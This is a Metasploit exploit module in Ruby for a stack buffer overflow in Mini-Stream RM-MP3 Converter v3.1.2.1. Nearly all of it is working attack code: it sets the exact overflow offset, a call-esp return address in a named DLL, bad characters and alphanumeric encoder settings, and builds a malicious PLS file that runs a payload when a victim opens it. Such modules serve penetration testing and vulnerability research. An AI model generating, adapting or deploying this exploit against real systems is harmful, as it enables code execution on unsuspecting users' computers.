# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Mini-Stream RM-MP3 Converter v3.1.2.1 (PLS File) Stack Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack based buffer overflow found in Mini-Stream RM-MP3
                Converter v3.1.2.1. The overflow is triggered when an unsuspecting victim
                opens the malicious PLS file.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Madjix&#039;,           # original discovery
                    &#039;Tiago Henriques&#039;,  # metasploit module
                    &#039;James Fitts&#039;       # clean ups
                ],
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/14373/&#039; ],
                    [ &#039;BID&#039;, &#039;34514&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 1500,
                    &#039;BadChars&#039; => "\x00\x09\x0a",
                    &#039;DisableNops&#039; => &#039;True&#039;,
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;PrependEncoder&#039; => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
                    &#039;EncoderType&#039; => Msf::Encoder::Type::AlphanumUpper,
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;ECX&#039;,
                        },
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Mini-stream RM-MP3 Converter v3.1.2.1.2010.03.30&#039;,
                        {
                            &#039;Ret&#039; => 0x100371f5, # call esp in MSRMfilter03.dll
                            &#039;Offset&#039; => 17417
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Jul 16 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.pls&#039;]),
                ], self.class)
    end
 
    def exploit
 
        pls =  "http://"
        pls << rand_text_alpha_upper(target[&#039;Offset&#039;])
        pls << [target.ret].pack(&#039;V&#039;)
        pls << rand_text_alpha_upper(8)
        pls << payload.encoded
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(pls)
 
    end
 
end



